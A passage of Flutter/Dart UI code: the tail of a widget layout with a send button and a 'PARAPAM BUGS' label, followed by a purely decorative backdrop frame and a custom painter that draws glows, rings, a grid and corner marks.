                  ),
                  const SizedBox(height: 18),
                  _buildSendButton(),
                  const SizedBox(height: 18),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Container(width: 28, height: 1, color: borderColor),
                      const SizedBox(width: 10),
                      Text(
                        "PARAPAM BUGS",
                        style: TextStyle(
                          color: textGrey.withOpacity(0.45),
                          fontSize: 9,
                          fontWeight: FontWeight.w800,
                          letterSpacing: 2,
                        ),
                      ),
                      const SizedBox(width: 10),
                      Container(width: 28, height: 1, color: borderColor),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
      ),
    );
  }
}


/// Visual-only frame for WINTRIX. It deliberately reuses the app's existing
/// palette and does not alter child state, navigation, networking, or actions.
class WintrixUiFrame extends StatelessWidget {
  final Widget child;
  final Color accent;
  final bool showGrid;
  final EdgeInsetsGeometry padding;

  const WintrixUiFrame({
    super.key,
    required this.child,
    required this.accent,
    this.showGrid = true,
    this.padding = EdgeInsets.zero,
  });

  @override
  Widget build(BuildContext context) {
    return Stack(
      fit: StackFit.expand,
      children: [
        IgnorePointer(
          child: CustomPaint(
            painter: _WintrixBackdropPainter(accent: accent, showGrid: showGrid),
          ),
        ),
        Padding(padding: padding, child: child),
      ],
    );
  }
}

class _WintrixBackdropPainter extends CustomPainter {
  final Color accent;
  final bool showGrid;

  const _WintrixBackdropPainter({required this.accent, required this.showGrid});

  @override
  void paint(Canvas canvas, Size size) {
    final shortest = (size.width < size.height ? size.width : size.height);

    final glow = Paint()
      ..shader = RadialGradient(
        center: const Alignment(0.88, -0.82),
        radius: 1.05,
        colors: [
          accent.withOpacity(0.11),
          accent.withOpacity(0.035),
          Colors.transparent,
        ],
        stops: const [0.0, 0.38, 1.0],
      ).createShader(Offset.zero & size);
    canvas.drawRect(Offset.zero & size, glow);

    final glow2 = Paint()
      ..shader = RadialGradient(
        center: const Alignment(-0.95, 0.95),
        radius: 1.15,
        colors: [
          accent.withOpacity(0.075),
          Colors.transparent,
        ],
      ).createShader(Offset.zero & size);
    canvas.drawRect(Offset.zero & size, glow2);

    final ring = Paint()
      ..style = PaintingStyle.stroke
      ..strokeWidth = 1.2
      ..color = accent.withOpacity(0.075);
    final r = shortest * 0.34;
    canvas.drawCircle(
      Offset(size.width * 0.98, size.height * 0.08),
      r,
      ring,
    );
    canvas.drawCircle(
      Offset(size.width * 0.98, size.height * 0.08),
      r * 0.72,
      ring,
    );

    if (showGrid) {
      final grid = Paint()
        ..style = PaintingStyle.stroke
        ..strokeWidth = 0.55
        ..color = accent.withOpacity(0.025);
      const gap = 28.0;
      for (double x = 0; x <= size.width; x += gap) {
        canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
      }
      for (double y = 0; y <= size.height; y += gap) {
        canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
      }
    }

    final corner = Paint()
      ..style = PaintingStyle.stroke
      ..strokeWidth = 2
      ..strokeCap = StrokeCap.round
      ..color = accent.withOpacity(0.18);
    const len = 26.0;
    const inset = 18.0;
    canvas.drawLine(Offset(inset, inset), Offset(inset + len, inset), corner);
    canvas.drawLine(Offset(inset, inset), Offset(inset, inset + len), corner);
    canvas.drawLine(Offset(size.width - inset, size.height - inset),
        Offset(size.width - inset - len, size.height - inset), corner);
    canvas.drawLine(Offset(size.width - inset, size.height - inset),
        Offset(size.width - inset, size.height - inset - len), corner);
  }

  @override
  bool shouldRepaint(covariant _WintrixBackdropPainter oldDelegate) =>
      oldDelegate.accent != accent || oldDelegate.showGrid != showGrid;
}